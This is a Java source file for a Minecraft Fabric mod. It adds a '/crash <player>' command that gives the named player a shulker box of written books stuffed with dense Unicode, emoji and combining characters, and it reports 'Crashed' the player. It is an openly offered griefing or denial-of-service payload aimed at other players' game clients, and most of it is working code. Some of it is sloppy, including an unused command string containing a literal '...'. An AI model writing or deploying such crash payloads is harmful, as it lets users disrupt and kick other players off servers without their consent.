package com.example;

import com.mojang.brigadier.Command;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;
import net.minecraft.util.registry.Registry;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;

public class CrashCommand {
    public static void register() {
        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
            dispatcher.register(net.minecraft.server.command.CommandManager.literal("crash")
                .then(net.minecraft.server.command.CommandManager.argument("player", StringArgumentType.word())
                    .executes(CrashCommand::execute)));
        });
    }

    private static int execute(CommandContext<ServerCommandSource> context) {
        String playerName = StringArgumentType.getString(context, "player");
        ServerPlayerEntity target = context.getSource().getServer().getPlayerManager().getPlayer(playerName);
        if (target == null) {
            context.getSource().sendError(Text.literal("Player not found: " + playerName));
            return 0;
        }
        // Shulker box NBT from your file, replacing @S with playerName
        String nbt = "/give " + playerName + " purple_shulker_box{BlockEntityTag:{Items:[{Slot:0b,id:\"minecraft:written_book\",Count:1b,tag:{title:\"CrashBook\",author:\"Lucas\",pages:['{\"text\":\"𒀱𒁃𒂷𒄿𒅗𒆠𒉿𒊬𒋾𒍣𒎙𒐫𒑊𒒷𒓗𒔭𒕤𒖳𒗰𒘺𒙿𒚩𒛒𒜖𒝫𒞷𒟲𒠶𒡹𒢼𒣿𒤻𒥾𒦽𒧼𒨻𒩺𒪹𒫸𒬷𒭶𒮵𒯴𒰳𒱲𒲱𒳰𒴯𒵮𒶭𒷬𒸫𒹪𒺩𒻨𒼧𒽦𒾥𒿤\"}']}}...]}";
        // Instead of running /give, build the ItemStack and give it
        ItemStack shulker = new ItemStack(Items.PURPLE_SHULKER_BOX);
        NbtCompound blockEntityTag = new NbtCompound();
        NbtList items = new NbtList();

        // Unicode chaos pages from your file
        String[] chaosPages = new String[] {
            "𒀱𒁃𒂷𒄿𒅗𒆠𒉿𒊬𒋾𒍣𒎙𒐫𒑊𒒷𒓗𒔭𒕤𒖳𒗰𒘺𒙿𒚩𒛒𒜖𒝫𒞷𒟲𒠶𒡹𒢼𒣿𒤻𒥾𒦽𒧼𒨻𒩺𒪹𒫸𒬷𒭶𒮵𒯴𒰳𒱲𒲱𒳰𒴯𒵮𒶭𒷬𒸫𒹪𒺩𒻨𒼧𒽦𒾥𒿤",
            "🀄🃏🧠🧨🌀🕳️🧬🧿🛸🪐🫠🫥🫧🫨🫰🫱🫲🫳🫴🫵🫶",
            "؜؞ؠءآأؤإئابةتثجحخدذرزسشصضطظعغػؼؽؾؿ",
            "̷̸̹̺̻̼͇͈͉͍͎̽̾̿̀́͂̓̈́͆͊͋͌ͅ͏͓͔͕͖͙͚͐͑͒͗͛͘͜͟͝͞͠",
            "𝔘𝔫𝔦𝔠𝔬𝔡𝔢 𝔠𝔥𝔞𝔬𝔰 𝔦𝔰 𝔥𝔢𝔯𝔢",
            "👁️‍🗨️👁️‍🗨️👁️‍🗨️👁️‍🗨️👁️‍🗨️👁️‍🗨️",
            "⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮⸮",
            "𓀀𓀁𓀂𓀃𓀄𓀅𓀆𓀇𓀈𓀉𓀊𓀋𓀌𓀍𓀎𓀏",
            "🧛🧟🧞🧜🧝🧙🧚🧘🧑‍🚀🧑‍🔬🧑‍🎤🧑‍🎨🧑‍🏫🧑‍🏭🧑‍💻🧑‍🔧",
            "∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞",
            "🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀🌀",
            "👾👾👾👾👾👾👾👾👾👾👾👾👾👾👾👾👾👾👾👾",
            "🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠🧠",
            "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥",
            "🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠🫠",
            "🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥🫥",
            "🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧🫧",
            "🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨🫨",
            "🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵🫵"
        };

        // Add up to 27 books (shulker box slots)
        for (int i = 0; i < chaosPages.length && i < 27; i++) {
            NbtCompound book = new NbtCompound();
            book.putByte("Slot", (byte)i);
            book.putString("id", "minecraft:written_book");
            book.putByte("Count", (byte)1);
            NbtCompound tag = new NbtCompound();
            tag.putString("title", "CrashBook");
            tag.putString("author", "Lucas");
            NbtList pages = new NbtList();
            // Replace @S with playerName if present
            pages.add(NbtString.of(chaosPages[i].replace("@S", playerName)));
            tag.put("pages", pages);
            book.put("tag", tag);
            items.add(book);
        }
        blockEntityTag.put("Items", items);
        shulker.setNbt(new NbtCompound());
        shulker.getNbt().put("BlockEntityTag", blockEntityTag);
        target.giveItemStack(shulker);
        context.getSource().sendFeedback(() -> Text.literal("Crashed " + playerName + " with a shulker box!"), false);
        return Command.SINGLE_SUCCESS;
    }
}
